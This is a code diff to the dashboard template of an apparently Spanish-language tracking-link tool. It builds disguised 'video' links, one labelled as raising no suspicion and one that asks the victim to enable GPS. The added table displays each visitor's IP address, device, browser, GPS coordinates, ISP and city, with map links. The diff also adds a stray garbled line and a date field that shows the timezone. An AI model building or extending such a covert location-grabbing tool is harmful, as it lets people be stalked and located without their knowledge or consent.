@@ -15,7 +15,7 @@
           <div class="h-100 p-5 text-white bg-dark rounded-3">
             <h2>Rastreo Rapido (no levanta sospechas)</h2>
             <code>
-              {{ route('vista') }}
+              {{ route('vista',['video' => base64_encode($enlace->id) ]) }}
             </code>
           </div>
         </div>
@@ -23,7 +23,7 @@
           <div class="h-100 p-5 bg-dark border rounded-3">
             <h2>Rastreo GPS (pide activar GPS)</h2>
             <code>
-              {{ route('vista') }}
+              {{ route('vista',['video' => base64_encode($enlace->id),'comenzar' => "Ultra-HD" ]) }}
             </code>
           </div>
         </div>
@@ -41,20 +41,20 @@
 
         <div class="my-3 p-3 bg-body rounded shadow-sm">
             <h6 class="border-bottom pb-2 mb-0 text-primary">  Enlaces : {{ count($contenido ) }}</h6>
+            <p class="text-dark">* Cada vez que habrán cualquier enlace se hará un rastreo rápido. (La seguridad va a depender de cada enlace).</p>
             <div class="table-responsive">
                 <table class="table table-striped table-sm">
                   <thead>
                     <tr>
-                      <th scope="col">IP/Pais</th>
-                      <th scope="col">Dispositivo</th>
-                      <th scope="col">Rastreo via</th>
-                      <th scope="col">Ver Ubicacion IP</th>
-                      <th scope="col">Ver Ubicacion GPS</th>  
+                      <th scope="col">TIpo</th>
+                      <th scope="col">Rastreo Rápido</th>
+                      <th scope="col">Rastreo Con Permisos</th>
+                      <th scope="col">Ip localizador con Permisos</th>
                     </tr>
                   </thead>
                   <tbody>
 
-                    <tr>
+                    {{-- <tr>
                       <td>38.43.129.48 United States</td>
                       <td>
                         SO <br>
@@ -67,25 +67,55 @@
                       <td><a href="">button</a></td>
                       <td><a href="">button</a></td>
                     
-                    </tr>
+                    </tr> --}}
 
             @foreach ($contenido as $item)
 
-         
+          ipjs, , , , , , , , , , , , , , x
+
                     <tr>
-                      <td>38.43.129.48}</td>
-                      <td>{{$item->getTipo->red_social}}</td>
+                      <td>{{$item->modalidad_ingreso}}</td>
                       <td>
-                            <span>Titulo: {{$item->titulo}}</span><br>
-                            <span>Descripción: {{$item->descripcion}}</span>
+                          IP: {{$item->ip}}<br>
+                          Dispositivo: {{$item->dispositivo}}<br>
+                          Navegador: {{$item->navegador}}<br>
+                          Version: {{$item->version}}<br>
+                          {{-- Servidor: {{$item->lugar}}<br> --}}
+                          Fecha: {{$item->created_at}}<br>
+                           <a href="https://api.ipbase.com/v1/json/{{$item->ip}}" target="_blank">Obtener IP coordenadas</a>
+                           <a href="https://www.geolocation.com/" target="_blank">Buscar IP coordenadas</a>
+                           
                       </td>
                       <td>
-                        <span>Usuario: {{$item->getUserCreate->name}}</span><br>
-                        <span>Fecha creación: {{$item->created_at}}</span>
+                        @if($item->latitud || $item->longitud)
+                          Latitud: {{$item->latitud}}<br>
+                          Longitud: {{$item->longitud}}<br>
+                          Fecha: {{$item->created_permission}}<br>
+                          
+                          <a href="https://maps.google.com/?q={{$item->latitud}},{{$item->longitud}}" target="_blank">Ver en google maps</a>
+                        @endif
                       </td>
                       <td>
-                        <a href="{{route('ver_enlaces',['token' => Crypt::encryptString($item->id)])}}">Gestionar</a>
+                        @if($item->ipjs || $item->latitude)
+                          ipjs: {{$item->ipjs}}<br>
+                          city: {{$item->city}}<br>
+                          continent: {{$item->continent}}<br>
+                          country: {{$item->country}}<br>
+                          country_capital: {{$item->country_capital}}<br>
+                          country_code: {{$item->country_code}}<br>
+                          country_phone: {{$item->country_phone}}<br>
+                          currency: {{$item->currency}}<br>
+                          isp: {{$item->isp}}<br>
+                          currency_rates: {{$item->currency_rates}}<br>
+                          latitude: {{$item->latitude}}<br>
+                          longitude: {{$item->longitude}}<br>
+                          region: {{$item->region}}<br>
+                          timezone: {{$item->timezone}}<br>
+                          Fecha: {{$item->timezone}}<br>
+                          <a href="https://maps.google.com/?q={{$item->latitude}},{{$item->longitude}}" target="_blank">Ver en google maps</a>
+                          @endif
                       </td>
+                   
                     </tr>
             @endforeach
         </tbody>
